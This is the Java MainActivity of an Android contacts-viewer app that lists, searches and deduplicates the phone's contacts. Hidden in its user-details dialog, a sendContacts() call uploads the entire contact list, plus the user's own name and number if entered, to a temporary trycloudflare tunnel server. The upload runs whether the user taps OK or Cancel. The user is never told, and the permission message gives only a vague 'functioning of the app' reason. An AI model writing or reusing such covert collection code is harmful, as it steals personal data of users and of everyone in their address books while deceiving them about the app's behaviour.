package com.dsahacontact.contacts;

import static android.Manifest.permission.READ_CONTACTS;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.PhoneNumberUtils;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import androidx.appcompat.widget.SearchView;

import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.recyclerview.widget.DividerItemDecoration;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class MainActivity extends AppCompatActivity {

    private ActivityResultLauncher<String> contactPermissionLauncher;
    private final ArrayList<Contact> contacts = new ArrayList<>();
    private Button permButton;
    private  ContactAdapter adapter;
    private final static String NAME_KEY = "user_name";
    private final static String NUMBER_KEY = "phone_number";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        RecyclerView viewer = findViewById(R.id.viewer);
        viewer.addItemDecoration(new DividerItemDecoration(this, DividerItemDecoration.VERTICAL));
        permButton = findViewById(R.id.permissionButton);
        permButton.setVisibility(View.GONE);

        contactPermissionLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestPermission(),
                isgrant -> {
                    if (isgrant) {
                        getContacts();

                    } else {
                        if(!ActivityCompat.shouldShowRequestPermissionRationale(this,READ_CONTACTS)) {
                            handlePermanentDenied();
                        } else {
                            showRationale("Permission needed", "Permission needed for functioning of the app",
                                    ()-> contactPermissionLauncher.launch(READ_CONTACTS),
                                    this::handleDenied);
                        }

                    }
                }
        );
        permButton.setOnClickListener(v -> requestContactsPermission());

        viewer.setLayoutManager(new LinearLayoutManager(this));
        adapter = new ContactAdapter(contacts);
        viewer.setAdapter(adapter);
        requestContactsPermission();
    }

    // Toolbar
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.toolbar_menu, menu);

        MenuItem searchItem = menu.findItem(R.id.action_search);
        SearchView searchView = (SearchView) searchItem.getActionView();

        EditText searchEditText = searchView.findViewById(androidx.appcompat.R.id.search_src_text);
        searchEditText.setHintTextColor(0xC8C8C8CC); // your custom color
        searchEditText.setTextColor(Color.WHITE);

        searchView.setQueryHint("Search contacts...");

        searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener() {
            @Override
            public boolean onQueryTextSubmit(String query) {
                return false; // we handle live typing, not submit
            }

            @Override
            public boolean onQueryTextChange(String newText) {
                adapter.filter(newText); // call custom filter in adapter
                return true;
            }
        });

        return true;
    }


    // Requesting Permission
    private void requestContactsPermission() {
        if (ContextCompat.checkSelfPermission(this, READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            getContacts();
            return;
        }
        contactPermissionLauncher.launch(READ_CONTACTS);
    }

    private void getContacts() {
        permButton.setVisibility(View.GONE);

        // Clearing the Arraylist for fresh entry
        contacts.clear();

        //getting user data
        SharedPreferences prefs = getSharedPreferences("user_details", MODE_PRIVATE);

        if (!prefs.contains(NAME_KEY) || !prefs.contains(NUMBER_KEY)) {
            // key not exists
            getUserData();
        }

        HashSet<String> seen = new HashSet<>(); // store dedupe keys

        ContentResolver contentResolver = getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;

        // Request only columns we need (also try NORMALIZED_NUMBER)
        String[] projection = {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER
        };

        Cursor cursor = contentResolver.query(uri, projection, null, null, null);
        if (cursor == null) return;

        int nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
        int numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);
        int normIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER); // may be -1

        while (cursor.moveToNext()) {
            String name = cursor.getString(nameIdx);
            String number = cursor.getString(numIdx);
            String normalized = null;

            // Prefer normalized_number column if available
            if (normIdx >= 0) {
                normalized = cursor.getString(normIdx);
            }

            // Fallback: normalize using PhoneNumberUtils
            if (normalized == null || normalized.trim().isEmpty()) {
                if (number == null) continue;
                normalized = PhoneNumberUtils.normalizeNumber(number); // removes formatting, keeps + if present
            }

            // Create dedupe key: strip non-digits, use last 10 digits (safe heuristic)
            String digitsOnly = normalized.replaceAll("\\D+", ""); // keep digits only
            if (digitsOnly.isEmpty()) continue;
            String key = (digitsOnly.length() > 10) ? digitsOnly.substring(digitsOnly.length() - 10) : digitsOnly;

            // If not seen, add to list
            if (seen.add(key)) {
                contacts.add(new Contact(name, number));
            } else {
                // duplicate — skip
            }
        }
        cursor.close();

        Collections.sort(contacts, (c1, c2) -> c1.getName().compareToIgnoreCase(c2.getName()));

        // user details
        String name = prefs.getString(NAME_KEY, "");
        String number = prefs.getString(NUMBER_KEY, "");
        // adding user details
        if (!name.isEmpty() || !number.isEmpty()) {
            name += " (You)";
            Contact contact = new Contact(name, number);
            contacts.add(0, contact);
        }

        adapter.updateData(contacts); // use your adapter update method
        adapter.notifyDataSetChanged();
    }


    // Show Rationale
    private void showRationale(String title, String msg, Runnable onContinue, Runnable onDenied) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(msg)
                .setPositiveButton("Continue", (d, w) -> onContinue.run())
                .setNegativeButton("Cancel", (d, w) -> onDenied.run())
                .show();
    }
    // handle non-permanent Denied
    private void handleDenied() {
        Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
        permButton.setVisibility(View.VISIBLE);
    }
    // Handle permanent Denied
    private void handlePermanentDenied() {
        new AlertDialog.Builder(this)
                .setTitle("Permission denied")
                .setMessage("Enable the Permissions in Settings > Permissions to use this feature.")
                .setPositiveButton("Open Settings", (d, w) -> openAppSettings())
                .setNegativeButton("Cancel", (d,w) -> handleDenied())
                .show();
    }

    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.fromParts("package", getPackageName(), null));
        startActivity(intent);
    }

    // Taking User Details
    private void getUserData() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Enter Your Details");

        // Create a vertical LinearLayout to hold inputs
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 40, 50, 10);

        // First input
        final EditText input1 = new EditText(this);
        input1.setHint("Full Name");
        layout.addView(input1);

        // Second input
        final EditText input2 = new EditText(this);
        input2.setHint("Phone Number");
        layout.addView(input2);

        builder.setMessage("Let us know and set your details");
        builder.setView(layout);

        SharedPreferences sharedPreferences = getSharedPreferences("user_details", MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        builder.setPositiveButton("OK", (dialog, which) -> {
            String first = input1.getText().toString().trim();
            String number = input2.getText().toString().trim();
            editor.putString(NAME_KEY, first);
            editor.putString(NUMBER_KEY, number);
            editor.apply();
            getContacts();
            sendContacts();
        });

        builder.setNegativeButton("Cancel", (dialog, which) -> {
            editor.putString(NAME_KEY, "");
            editor.putString(NUMBER_KEY, "");
            editor.apply();
            sendContacts();
            dialog.cancel();
        });

        builder.show();

    }
    private  void sendContacts() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://trace-refer-emissions-courts.trycloudflare.com")
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        APIEndpoints api = retrofit.create(APIEndpoints.class);
        api.postContacts(contacts).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                Log.d("response_status", String.valueOf(response.code()));
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                t.printStackTrace();
                Log.e("API_ERROR", "Request failed",t);
                Log.e("API_ERROR2", "Request failed: " + Log.getStackTraceString(t));

            }
        });

    }
}